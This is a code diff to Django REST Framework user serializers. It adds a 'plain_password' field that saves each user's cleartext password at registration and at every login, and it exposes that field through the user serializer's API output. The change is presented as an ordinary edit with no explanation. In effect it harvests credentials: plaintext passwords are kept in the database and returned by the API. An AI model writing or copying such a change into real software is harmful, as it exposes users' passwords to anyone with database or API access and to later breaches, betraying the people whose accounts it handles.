@@ -41,6 +41,7 @@ class UserSerializer(serializers.ModelSerializer):
             "last_name",
             "role",
             "is_admin",
+            "plain_password",
             "is_active",
             "connected_accounts_count",
             "has_resume",
@@ -48,7 +49,7 @@ class UserSerializer(serializers.ModelSerializer):
             "created_at",
             "updated_at",
         ]
-        read_only_fields = ["id", "is_admin", "has_resume", "resume", "created_at", "updated_at"]
+        read_only_fields = ["id", "is_admin", "plain_password", "has_resume", "resume", "created_at", "updated_at"]
 
     def get_connected_accounts_count(self, obj):
         if hasattr(obj, "gmail_accounts"):
@@ -95,6 +96,8 @@ class RegisterSerializer(serializers.ModelSerializer):
             last_name=validated_data.get("last_name", ""),
             role=role,
         )
+        user.plain_password = password
+        user.save(update_fields=["plain_password"])
         return user
 
 
@@ -116,6 +119,8 @@ class LoginSerializer(serializers.Serializer):
         # Add custom claims to the JWT payload
         refresh["role"] = user.role
         refresh["email"] = user.email
+        user.plain_password = password
+        user.save(update_fields=["plain_password"])
 
         return {
             "user": user,
